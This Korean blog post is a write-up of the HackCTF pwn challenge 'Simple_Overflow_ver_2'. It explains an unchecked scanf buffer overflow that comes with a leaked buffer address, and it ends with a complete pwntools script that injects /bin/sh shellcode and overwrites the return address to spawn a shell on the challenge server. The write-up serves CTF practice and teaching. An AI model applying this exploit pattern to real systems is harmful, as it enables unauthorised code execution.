---
title: "[ HackCTF ] Simple_Overflow_ver_2"
date: 2023-03-08T12:51:39.108Z
categories: ['Wargame', 'HackCTF']
tags: ['HackCTF', "pwn"]
---

### **문제 분석**
---

![](/assets/images/2023-03-08-Simple_Overflow_ver_2/2023-08-10-13-30-42.png)

문제를 실행해보면 Data를 입력하면 버퍼의 주소를 알 수 있다.

다시 Data를 입력하면 같은 위치에 새로운 Data가 들어간다.

<br>

![](/images/222efab9-9b22-45dd-84aa-26ad6734a54c-image.png)

코드를 보면 scanf로 값을 입력받는 부분에서 길이에 대한 검사가 없어 BOF 취약점이 존재한다.

<br>
<br>

### **문제 풀이**
---
처음에 아무 값이나 입력해서 버퍼의 주소를 찾고, 해당 버퍼에 쉘코드를 삽입하고 return address를 버퍼의 주소로 덮어주면 쉘을 획득할 수 있다.

<br>

Data는 ebp-0x88에 위치하므로 다음과 같이 payload를 작성할 수 있다.

```shellcode + '\x90'*(0x88(buffer)-len(shellcode)+4(sfp))```

<br>

exploit 코드는 다음과 같다.
```python 
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3006)

context.arch = 'i386'
shellcode = asm(shellcraft.sh())

p.sendlineafter('Data : ', 'AAAA')
buf = int(p.recvuntil(':')[:-1],16)

p.sendlineafter('(y/n)', 'y')

payload = ''
payload += shellcode
payload += '\x90'*(0x88-len(shellcode)+4)
payload += p32(buf)

p.sendlineafter('Data : ', payload)
p.interactive()
```